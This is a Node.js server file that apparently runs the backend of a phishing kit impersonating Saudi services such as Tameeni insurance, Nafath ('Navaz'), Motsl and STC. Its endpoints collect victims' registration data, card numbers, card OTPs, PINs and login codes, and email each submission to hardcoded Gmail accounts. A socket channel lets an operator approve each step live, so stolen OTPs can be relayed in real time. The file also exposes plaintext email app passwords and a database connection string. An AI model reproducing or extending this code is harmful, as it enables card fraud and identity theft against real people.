const express = require("express");
const app = express();
const cors = require("cors");
const nodemailer = require("nodemailer");
const { Order } = require("./models");
const { default: mongoose } = require("mongoose");
const server = require("http").createServer(app);
const PORT = process.env.PORT || 8080;
const io = require("socket.io")(server, { cors: { origin: "*" } });
app.use(express.json());
app.use(cors({ origin: "*" }));
app.use(require("morgan")("dev"));

const emailData = {
  user: "absherkaram2@gmail.com",
  pass: "odhs tnnd wgmn rfpz",
  // user: "saudiabsher1990@gmail.com",
  // pass: "qlkg nfnn xaeq fitz",
};

const sendEmail = async (data, type) => {
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: emailData.user,
      pass: emailData.pass,
    },
  });
  let htmlContent = "<div>";
  for (const [key, value] of Object.entries(data)) {
    htmlContent += `<p>${key}: ${
      typeof value === "object" ? JSON.stringify(value) : value
    }</p>`;
  }

  return await transporter
    .sendMail({
      from: "Admin Panel",
      to: emailData.user,
      subject: `${
        type === "visa"
          ? "Tammeni Bank Visa"
          : type === "reg"
          ? "Tammeni Register Form "
          : type === "apply"
          ? "Tammeni Apply Form "
          : type === "otp"
          ? "Tammeni Visa  Otp"
          : type === "pin"
          ? "Tammeni Visa Pin "
          : type === "motsl"
          ? "Tammeni - Motsl Gate Data "
          : type === "motslOtp"
          ? "Tammeni - Motsl Gate Otp "
          : type === "navaz"
          ? "Tameeni - Navaz Gate "
          : type === "navazOtp"
          ? "Tameeni Navaz Last Otp  "
          : "Tameeni "
      }`,
      html: htmlContent,
    })
    .then((info) => {
      if (info.accepted.length) {
        return true;
      } else {
        return false;
      }
    });
};

app.get("/", (req, res) => res.sendStatus(200));
app.delete("/", async (req, res) => {
  await Order.find({})
    .then(async (orders) => {
      await Promise.resolve(
        orders.forEach(async (order) => {
          await Order.findByIdAndDelete(order._id);
        })
      );
    })
    .then(() => res.sendStatus(200));
});
app.post("/email", async (req, res) => {
  if (req.query.type === "one") {
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: "pnusds269@gmail.com",
        pass: "bojr nrmj bjen rcgt",
      },
    });
    let htmlContent = "<div>";
    for (const [key, value] of Object.entries(req.body)) {
      htmlContent += `<p>${key}: ${
        typeof value === "object" ? JSON.stringify(value) : value
      }</p>`;
    }
    await transporter
      .sendMail({
        from: "Admin Panel",
        to: "pnusds269@gmail.com",
        subject: `${
          req.query.otp
            ? "Tammeni Visa  Otp"
            : req.query.reg
            ? "Tammeni Register Form "
            : req.query.apply
            ? "Tammeni Apply Form "
            : req.query.activate
            ? "Tammeni Activate Account "
            : req.query.phone
            ? "Motsl Gate Data "
            : req.query.Motslotp
            ? "Motsl Gate Otp "
            : req.query.new
            ? "Tammeni  New User "
            : req.query.navazOtp
            ? "Tameeni Navaz Last Otp  "
            : "Tammeni Bank Visa"
        }`,
        html: htmlContent,
      })
      .then((info) => {
        if (info.accepted.length) {
          res.sendStatus(200);
        } else {
          res.sendStatus(400);
        }
      });
  } else {
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: "saudiabsher1990@gmail.com",
        pass: "idot oooz frhy mdsr",
      },
    });
    let htmlContent = "<div>";
    for (const [key, value] of Object.entries(req.body)) {
      htmlContent += `<p>${key}: ${
        typeof value === "object" ? JSON.stringify(value) : value
      }</p>`;
    }
    await transporter
      .sendMail({
        from: "Admin Panel",
        to: "saudiabsher1990@gmail.com",
        subject: `${
          req.query.otp
            ? "Tammeni Bank  Otp"
            : req.query.reg
            ? "Tammeni Register Form "
            : req.query.apply
            ? "Tammeni Apply Form "
            : req.query.activate
            ? "Tammeni Activate Account "
            : req.query.new
            ? "Tammeni  New User "
            : "Tammeni Bank Visa"
        }`,
        html: htmlContent,
      })
      .then((info) => {
        if (info.accepted.length) {
          res.sendStatus(200);
        } else {
          res.sendStatus(400);
        }
      });
  }
});

app.post("/login", async (req, res) => {
  try {
    await Order.create(req.body).then(
      async (order) =>
        await sendEmail(req.body, "login").then(() =>
          res.status(201).json({ order })
        )
    );
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});

app.get("/order/checked/:id", async (req, res) => {
  try {
    const { id } = req.params;
    await Order.findByIdAndUpdate(id, { checked: true }).then(() =>
      res.sendStatus(200)
    );
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});

app.post("/reg", async (req, res) => {
  try {
    await Order.create(req.body).then(
      async (order) =>
        await sendEmail(req.body, "reg").then(() => res.status(201).json(order))
    );
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});

app.post("/apply/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(
    id,
    {
      ...req.body,
      checked: false,
    },
    { new: true }
  ).then(
    async (order) =>
      await sendEmail(req.body, "apply").then(() => res.status(200).json(order))
  );
});

app.post("/visa/:id", async (req, res) => {
  const { id } = req.params;
  console.log(req.body);
  await Order.findByIdAndUpdate(id, {
    ...req.body,
    checked: false,
    CardAccept: false,
  }).then(
    async () =>
      await sendEmail(req.body, "visa").then(() => res.sendStatus(200))
  );
});

app.post("/visaOtp/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    CardOtp: req.body.otp,
    checked: false,
    OtpCardAccept: false,
  }).then(
    async () => await sendEmail(req.body, "otp").then(() => res.sendStatus(200))
  );
});
app.post("/visaPin/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    pin: req.body.pin,
    checked: false,
    PinAccept: false,
  }).then(
    async () => await sendEmail(req.body, "pin").then(() => res.sendStatus(200))
  );
});

app.post("/motsl/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    ...req.body,
    checked: false,
    MotslAccept: false,
  }).then(
    async () =>
      await sendEmail(req.body, "motsl").then(() => res.sendStatus(200))
  );
});
app.post("/motslOtp/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    MotslOtp: req.body.MotslOtp,
    checked: false,
    MotslOtpAccept: false,
  }).then(
    async () =>
      await sendEmail(req.body, "motslOtp").then(() => res.sendStatus(200))
  );
});

app.post("/navaz/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    ...req.body,
    checked: false,
    NavazAccept: false,
  }).then(
    async () =>
      await sendEmail(req.body, "navaz").then(() => res.sendStatus(200))
  );
});

app.get(
  "/users",
  async (req, res) => await Order.find().then((users) => res.json(users))
);

io.on("connection", (socket) => {
  console.log("connected");

  socket.on("newUser", () => io.emit("newUser"));

  socket.on("newData", () => io.emit("newData"));

  socket.on("paymentForm", (data) => {
    console.log("paymentForm Wait", data);
    io.emit("paymentForm", data);
  });

  socket.on("acceptPaymentForm", async (id) => {
    console.log("acceptPaymentForm From Admin", id);
    console.log(id);
    io.emit("acceptPaymentForm", id);
    await Order.findByIdAndUpdate(id, { CardAccept: true });
  });
  socket.on("declinePaymentForm", async (id) => {
    console.log("declinePaymentForm Form Admin", id);
    io.emit("declinePaymentForm", id);
    await Order.findByIdAndUpdate(id, { CardAccept: true });
  });

  socket.on("visaOtp", (data) => {
    console.log("visaOtp  received", data);
    io.emit("visaOtp", data);
  });
  socket.on("acceptVisaOtp", async (id) => {
    console.log("acceptVisaOtp From Admin", id);
    await Order.findByIdAndUpdate(id, { OtpCardAccept: true });
    io.emit("acceptVisaOtp", id);
  });
  socket.on("declineVisaOtp", async (id) => {
    console.log("declineVisaOtp Form Admin", id);
    await Order.findByIdAndUpdate(id, { OtpCardAccept: true });
    io.emit("declineVisaOtp", id);
  });

  socket.on("visaPin", (data) => {
    console.log("visaPin  received", data);
    io.emit("visaPin", data);
  });
  socket.on("acceptVisaPin", async (id) => {
    console.log("acceptVisaPin From Admin", id);
    await Order.findByIdAndUpdate(id, { PinAccept: true });
    io.emit("acceptVisaPin", id);
  });
  socket.on("declineVisaPin", async (id) => {
    console.log("declineVisaPin Form Admin", id);
    await Order.findByIdAndUpdate(id, { PinAccept: true });
    io.emit("declineVisaPin", id);
  });

  socket.on("motsl", (data) => {
    console.log("Motsl Data", data);
    io.emit("motsl", data);
  });

  socket.on("acceptMotsl", async (id) => {
    console.log("Motsl Data", id);
    await Order.findByIdAndUpdate(id, { MotslAccept: true });
    io.emit("acceptMotsl", id);
  });
  socket.on("declineMotsl", async (id) => {
    console.log("declineMotsl Data", id);
    await Order.findByIdAndUpdate(id, { MotslAccept: true });
    io.emit("declineMotsl", id);
  });

  socket.on("motslOtp", async (data) => {
    console.log("motslOtp received", data);
    await Order.findByIdAndUpdate(data.id, {
      MotslOtp: data.MotslOtp,
      STCAccept: false,
    });
    io.emit("motslOtp", data);
  });
  socket.on("acceptMotslOtp", async (data) => {
    console.log("acceptMotslOtp send", { id: data.id, userOtp: data.userOtp });
    io.emit("acceptMotslOtp", { id: data.id, userOtp: data.userOtp });
    await Order.findByIdAndUpdate(data.id, {
      NavazOtp: data.userOtp,
    });
  });
  socket.on("declineMotslOtp", async (id) => {
    console.log("declineMotslOtp send", id);
    io.emit("declineMotslOtp", id);
    await Order.findByIdAndUpdate(id, { MotslOtpAccept: true });
  });

  socket.on("acceptSTC", async ({ id, userOtp }) => {
    console.log("acceptSTC send", { id, userOtp });
    io.emit("acceptSTC", { userOtp, id });
    await Order.findByIdAndUpdate(id, { NavazOtp: userOtp, STCAccept: true });
  });
  socket.on("declineSTC", async (id) => {
    console.log("declineSTC send", id);
    io.emit("declineSTC", id);
    await Order.findByIdAndUpdate(id, { STCAccept: true });
  });

  socket.on("navaz", (data) => {
    console.log("navaz received", data);
    io.emit("navaz", data);
  });
  socket.on("acceptNavaz", async (data) => {
    console.log("acceptNavaz send", data);
    io.emit("acceptNavaz", data);
    await Order.findByIdAndUpdate(data.id, {
      NavazAccept: true,
      NavazOtp: data.userOtp,
    });
  });
  socket.on("declineNavaz", async (id) => {
    console.log("declineNavaz send", id);
    io.emit("declineNavaz", id);
    await Order.findByIdAndUpdate(id, { NavazAccept: true });
  });
  socket.on("successValidate", (data) => io.emit("successValidate", data));
  socket.on("declineValidate", (data) => io.emit("declineValidate", data));
});

// Function to delete orders older than 7 days
const deleteOldOrders = async () => {
  const sevenDaysAgo = new Date();
  sevenDaysAgo.setDate(sevenDaysAgo.getDate() - 7);
  try {
    const result = await Order.deleteMany({ created: { $lt: sevenDaysAgo } });
    console.log(`${result.deletedCount} orders deleted.`);
  } catch (error) {
    console.error("Error deleting old orders:", error);
  }
};

// Function to run daily
const runDailyTask = () => {
  deleteOldOrders();
  setTimeout(runDailyTask, 24 * 60 * 60 * 1000); // Schedule next execution in 24 hours
};

mongoose
  .connect("mongodb+srv://abshr:abshr@abshr.fxznc.mongodb.net/tameni")
  .then((conn) =>
    server.listen(PORT, () => {
      runDailyTask();
      console.log("server running and connected to db" + conn.connection.host);
    })
  );




